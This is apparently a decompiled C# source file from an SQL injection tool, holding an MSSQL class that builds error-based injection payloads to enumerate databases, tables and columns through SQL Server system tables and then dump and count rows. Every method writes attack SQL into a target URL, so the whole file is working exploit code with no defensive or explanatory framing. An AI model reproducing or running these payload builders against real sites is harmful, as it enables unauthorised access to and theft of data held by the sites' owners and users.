using System;
using System.Collections.Generic;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

namespace DataBase
{
	// Token: 0x02000101 RID: 257
	public class MSSQL
	{
		// Token: 0x06001117 RID: 4375 RVA: 0x00075D20 File Offset: 0x00073F20
		private static string smethod_0(InjectionType injectionType_0, bool bool_0)
		{
			string result;
			if (injectionType_0 == InjectionType.Error)
			{
				if (bool_0)
				{
					result = "convert(int,(%K%+(#)+%K%) COLLATE SQL_Latin1_General_Cp1254_CS_AS)";
				}
				else
				{
					result = "convert(int,(%K%+(#)+%K%))";
				}
			}
			else
			{
				result = "(%K%+(#)+%K%)";
			}
			return result;
		}

		// Token: 0x06001118 RID: 4376 RVA: 0x00075D50 File Offset: 0x00073F50
		public static string Info(string sTraject, InjectionType oError, bool bCollateLatin, List<string> lColumn, string sCastType, string sEndUrl = "")
		{
			string text = Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), "#", "cast(# as " + sCastType + ")"));
			string newValue = Class23.smethod_21(Class54.string_0, false, "+", "char");
			string str = Class23.smethod_21(Class54.string_2, false, "+", "char");
			string text2 = MSSQL.smethod_0(oError, bCollateLatin);
			checked
			{
				string text3;
				if (lColumn.Count == 1)
				{
					text3 = text.Replace("#", lColumn[0].Trim());
				}
				else
				{
					text3 = "select (";
					int num = lColumn.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						if (i > 0)
						{
							text3 = text3 + "+" + str + "+";
						}
						string str2 = text.Replace("#", lColumn[i].Trim());
						text3 += str2;
					}
					text3 += ") as t";
				}
				text2 = text2.Replace("%K%", newValue);
				text2 = text2.Replace("#", text3);
				text2 = Class23.smethod_7(text2);
				return sTraject.Replace("[t]", text2) + sEndUrl;
			}
		}

		// Token: 0x06001119 RID: 4377 RVA: 0x00075E94 File Offset: 0x00074094
		public static string DataBases(string sTraject, InjectionType oError, bool bCorrentDB, string sCastType, bool bCollateLatin, int iDbId, int iAfectedRows = 0, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
		{
			string text = Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), "#", "cast(# as " + sCastType + ")"));
			string newValue = Class23.smethod_21(Class54.string_0, false, "+", "char");
			string text2 = MSSQL.smethod_0(oError, bCollateLatin);
			text2 = text2.Replace("%K%", newValue);
			checked
			{
				if (bCorrentDB)
				{
					text2 = text2.Replace("#", text.Replace("#", "DB_NAME()"));
				}
				else if (string.IsNullOrEmpty(sWhere))
				{
					text2 = text2.Replace("#", "select distinct top 1 # from [master]..[sysdatabases] where [dbid]=" + Conversions.ToString(iDbId + 1));
				}
				else
				{
					string text3 = "isnull(#,char(32))";
					text3 = text.Replace("#", text3);
					text3 = text3.Replace("#", "[name]");
					text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("select top 1 " + text3 + " from (select top %INDEX% [name] from [master]..[sysdatabases] where " + sWhere, Interaction.IIf(!string.IsNullOrEmpty(sOrderBy), " order by " + sOrderBy + ", [name] asc", " order by [name] asc")), ")"), "sq order by [name] desc")));
					text2 = text2.Replace("%INDEX%", Conversions.ToString(iDbId + 1));
				}
				text2 = text2.Replace("#", text.Replace("#", "[name]"));
				text2 = Class23.smethod_7(text2);
				return sTraject.Replace("[t]", text2) + sEndUrl;
			}
		}

		// Token: 0x0600111A RID: 4378 RVA: 0x0007601C File Offset: 0x0007421C
		public static string Tables(string sTraject, string sDataBase, InjectionType oError, string sCastType, bool bCollateLatin, int iIndex, int iAfectedRows = 0, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
		{
			string text = Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), "#", "cast(# as " + sCastType + ")"));
			string newValue = Class23.smethod_21(Class54.string_0, false, "+", "char");
			string text2 = MSSQL.smethod_0(oError, bCollateLatin);
			text2 = text2.Replace("%K%", newValue);
			text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
			{
				"select distinct top 1 # from [",
				sDataBase,
				"]..[sysobjects] where id=(select top 1 id from (select distinct top ",
				Conversions.ToString(checked(iIndex + 1)),
				" id from [",
				sDataBase,
				"]..[sysobjects] where xtype=char(85) "
			}), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), "order BY id ASC) "), " sq order BY id DESC)")));
			text2 = text2.Replace("#", text.Replace("#", "[name]"));
			text2 = Class23.smethod_7(text2);
			return sTraject.Replace("[t]", text2) + sEndUrl;
		}

		// Token: 0x0600111B RID: 4379 RVA: 0x00076140 File Offset: 0x00074340
		public static string Columns(string sTraject, string sDataBase, string sTable, InjectionType oError, string sCastType, bool bCollateLatin, int iIndex, int iAfectedRows = 0, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
		{
			string text = Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), "#", "cast(# as " + sCastType + ")"));
			string newValue = Class23.smethod_21(Class54.string_0, false, "+", "char");
			string text2 = MSSQL.smethod_0(oError, bCollateLatin);
			text2 = text2.Replace("%K%", newValue);
			text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
			{
				"select distinct top 1 # from [",
				sDataBase,
				"]..[syscolumns] where id=(select id from [",
				sDataBase,
				"]..[sysobjects] where [name]=%TB%) and [name] not in (select distinct top %INDEX% [name] from [",
				sDataBase,
				"]..[syscolumns] where id=(select top 1 id from [",
				sDataBase,
				"]..[sysobjects] where [name]=%TB%"
			}), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), ")"), ")")));
			text2 = text2.Replace("%TB%", Class23.smethod_21(sTable, false, "+", "char"));
			text2 = text2.Replace("%INDEX%", Conversions.ToString(iIndex));
			text2 = text2.Replace("#", text.Replace("#", "[name]"));
			text2 = Class23.smethod_7(text2);
			return sTraject.Replace("[t]", text2) + sEndUrl;
		}

		// Token: 0x0600111C RID: 4380 RVA: 0x00076298 File Offset: 0x00074498
		public static string Dump(string sTraject, string sDataBase, string sTable, List<string> lColumn, bool bIFNULL, InjectionType oError, string sCastType, bool bCollateLatin, int iIndex, int iAfectedRows = 0, string sWhere = "", string sOrderBy = "", string sEndurl = "", string sCustomQuery = "", int iMSQLErrCIndex = -1)
		{
			bIFNULL = true;
			string text = Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), "#", "cast(# as " + sCastType + ")"));
			string text2 = Conversions.ToString(Interaction.IIf(bIFNULL, "isnull(#,char(" + Conversions.ToString(32) + "))", "#"));
			string newValue = Class23.smethod_21(Class54.string_0, false, "+", "char");
			string text3 = Class23.smethod_21(Class54.string_2, false, "+", "char");
			string text4 = MSSQL.smethod_0(oError, bCollateLatin);
			checked
			{
				if (string.IsNullOrEmpty(sCustomQuery))
				{
					string text5 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("select top 1 %cs% from(select top [x] %cl% from [%db%]..[%tb%] ", Interaction.IIf(string.IsNullOrEmpty(sWhere), "", "where " + sWhere + " ")), "order by %cs2% asc"), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", "," + sOrderBy)), ") "), "sq order by %cs2% desc"));
					if (string.IsNullOrEmpty(sDataBase))
					{
						text5 = text5.Replace("[%db%]..", "");
					}
					string text6 = "";
					string text7 = "";
					text5 = text5.Replace("%cs2%", "[" + lColumn[0].Trim() + "]");
					if (lColumn.Count == 1)
					{
						text5 = text5.Replace("%cs%", text2.Replace("#", "[" + lColumn[0].Trim() + "]"));
						text5 = text5.Replace("%cl%", text2.Replace("#", "[" + lColumn[0].Trim() + "]"));
					}
					else
					{
						int num = lColumn.Count - 1;
						for (int i = 0; i <= num; i++)
						{
							if (i > 0)
							{
								text6 = text6 + "+" + text3 + "+";
							}
							if (i > 0)
							{
								text7 += ",";
							}
							if (i == iMSQLErrCIndex)
							{
								text5 = text5.Replace("%cs%", text2.Replace("#", text.Replace("#", "[" + lColumn[i].Trim() + "]")));
								text6 = text6 + "[" + lColumn[i].Trim() + "]";
							}
							else
							{
								text6 += text.Replace("#", text2.Replace("#", text.Replace("#", "[" + lColumn[i].Trim() + "]")));
							}
							text7 = text7 + "[" + lColumn[i].Trim() + "]";
						}
						text5 = text5.Replace("%cs%", text6);
					}
					text5 = text5.Replace("%cl%", text7);
					text4 = text4.Replace("#", text5);
				}
				else
				{
					text4 = text4.Replace("#", sCustomQuery);
				}
				text4 = text4.Replace("%db%", sDataBase);
				text4 = text4.Replace("%tb%", sTable);
				text4 = text4.Replace("[s]", text3);
				text4 = text4.Replace("[x]", Conversions.ToString(iIndex + 1));
				text4 = text4.Replace("%K%", newValue);
				text4 = Class23.smethod_7(text4);
				return sTraject.Replace("[t]", text4) + sEndurl;
			}
		}

		// Token: 0x0600111D RID: 4381 RVA: 0x00076658 File Offset: 0x00074858
		public static string Count(string sTraject, InjectionType oError, string sCastType, bool bCollateLatin, Schema o, string sDataBase, string sTable, string sWhere = "", string sEndUrl = "")
		{
			Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), "#", "cast(# as " + sCastType + ")"));
			string newValue = Class23.smethod_21(Class54.string_0, false, "+", "char");
			Class23.smethod_21(Class54.string_2, false, "+", "char");
			string text = MSSQL.smethod_0(oError, bCollateLatin);
			switch (o)
			{
			case Schema.DATABASES:
				text = text.Replace("#", Conversions.ToString(Operators.ConcatenateObject("select top 1 # from [master]..[sysdatabases]", Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " where " + sWhere))));
				break;
			case Schema.TABLES:
				text = text.Replace("#", Conversions.ToString(Operators.ConcatenateObject("select top 1 # from [" + sDataBase + "]..[sysobjects] where xtype=char(85)", Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere))));
				break;
			case Schema.COLUMNS:
				text = text.Replace("#", Conversions.ToString(Operators.ConcatenateObject(string.Concat(new string[]
				{
					"select top 1 # from [",
					sDataBase,
					"]..[syscolumns] where id=(select id from  [",
					sDataBase,
					"]..[sysobjects] where [name]=",
					Class23.smethod_21(sTable, false, "+", "char"),
					")"
				}), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere))));
				break;
			case Schema.ROWS:
				text = text.Replace("#", Conversions.ToString(Operators.ConcatenateObject(string.Concat(new string[]
				{
					"select top 1 # from [",
					sDataBase,
					"]..[",
					sTable,
					"] "
				}), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", "where " + sWhere))));
				break;
			}
			text = text.Replace("#", "cast(count(*) as char)");
			text = text.Replace("%K%", newValue);
			text = Class23.smethod_7(text);
			return sTraject.Replace("[t]", text) + sEndUrl;
		}

		// Token: 0x040008A3 RID: 2211
		private static string string_0;

		// Token: 0x040008A4 RID: 2212
		private static string string_1;
	}
}
